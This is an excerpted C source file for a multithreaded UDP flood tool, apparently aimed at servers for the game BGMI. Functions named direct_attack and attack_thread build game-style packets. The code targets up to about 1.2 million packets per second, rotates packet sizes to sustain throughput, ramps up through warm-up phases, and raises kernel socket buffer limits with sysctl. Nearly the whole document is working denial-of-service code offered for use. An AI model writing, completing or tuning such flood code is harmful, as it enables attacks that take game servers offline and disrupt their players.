...
#define BATCH_UPDATE 20000
#define WARMUP_SECONDS 3
#define SOCKET_SNDBUF 3145728
#define SOCKET_RCVBUF 1572864
...
void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=3145728 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=3145728 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=1572864 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_default=1572864 >/dev/null 2>&1");
    ...
    system("sysctl -w net.ipv4.udp_mem='33554432 50331648 67108864' >/dev/null 2>&1");
...
int get_warmup_multiplier(int phase) {
    int warmup_phases[] = {300, 600, 900, 1200, 1400};
    if (phase >= 0 && phase < 5) {
...
int get_base_burst(int packet_size) {
    if (packet_size <= 24) return 140;
    if (packet_size <= 28) return 135;
    if (packet_size <= 32) return 130;
    if (packet_size <= 36) return 124;
    if (packet_size <= 40) return 118;
    if (packet_size <= 44) return 105;
    if (packet_size <= 48) return 100;
    if (packet_size <= 52) return 97;
    if (packet_size <= 56) return 94;
    if (packet_size <= 60) return 85;
    if (packet_size <= 64) return 80;
    if (packet_size <= 72) return 70;
    return 58;
}
...
void *direct_attack(void *arg) {
    ...
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        ...
        create_bgmi_packet(packets[i], max_packet_size, thread_idx + 1000, i * 1000, &seed, 1);
    }
    ...
    int target_pps = (PACKET_SIZE <= 40) ? 1100000 : 
                     (PACKET_SIZE <= 56) ? 825000 : 650000;
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (current_elapsed % 30 == 0 && current_elapsed > last_rotation) {
            last_rotation = current_elapsed;
            if (thread_idx % 5 == 0) {
                int sizes[] = {24, 28, 32, 36, 40, 44, 48, 52, 56};
                int new_size = sizes[(current_elapsed / 30) % 9];
        ...
        if (curr_pps > 0) {
            if (curr_pps < target_pps * 0.9) {
                dynamic_burst = base_burst * 1.05;
            } else if (curr_pps > target_pps * 1.1) {
                dynamic_burst = base_burst * 0.95;
            }
        }
        
        dynamic_burst = (dynamic_burst * power_level) / 100;
        
        if (dynamic_burst > base_burst * 1.2) {
            dynamic_burst = base_burst * 1.2;
        }
        if (dynamic_burst < base_burst * 0.8) {
            dynamic_burst = base_burst * 0.8;
        }
        
        int current_size = atomic_load(&warmup_complete) ? 
                          atomic_load(&global_packet_size) : max_packet_size;
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            create_bgmi_packet(packets[i], current_size, thread_idx + 1000, seq_counter, &seed, !atomic_load(&warmup_complete));
...
void *attack_thread(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        create_bgmi_packet(packet, current_size, tid, seq_local, &seed, !atomic_load(&warmup_complete));
...
void *warmup_controller(void *arg) {
    ...
    for (int phase = 0; phase < 5 && !atomic_load(&stop_signal); phase++) {
        ...
        if (atomic_load(&should_attack)) {
            ...
            if (!atomic_load(&warmup_complete)) {
                if (!warmup_displayed && pps > 0) {
                    printf("⚡ Warm-up PPS: %lluK | Phase: %d%%\n", 
                           pps/1000, get_warmup_multiplier(atomic_load(&current_warmup_phase)));
                    warmup_displayed = 1;
                } else if (pps > 0) {
                    printf("⚡ Warm-up PPS: %lluK | Phase: %d%% | Peak: %lluK\n", 
                           pps/1000, get_warmup_multiplier(atomic_load(&current_warmup_phase)), 
...
int main(int argc, char *argv[]) {
    ...
    printf("🧵 Threads: %d (50-500 recommended)\n", THREAD_COUNT);
    printf("⚡ Direct Attack Power: %d%%\n", DIRECT_ATTACK_POWER);
    printf("🔥 Warm-up: 300%% → 1400%% in 3s\n");
    printf("===============================================\n");
    
    if (PACKET_SIZE <= 40) {
        printf("💡 Target PPS: 1.0M - 1.2M\n");
    } else if (PACKET_SIZE <= 56) {
        printf("💡 Target PPS: 800K - 850K\n");
    } else {
        printf("💡 Target PPS: 600K - 700K\n");
    }
    printf("\n");
    ...
    printf("🚀 Initializing %d attack threads...\n", THREAD_COUNT);
    ...
    printf("✅ All threads ready - starting warm-up\n");
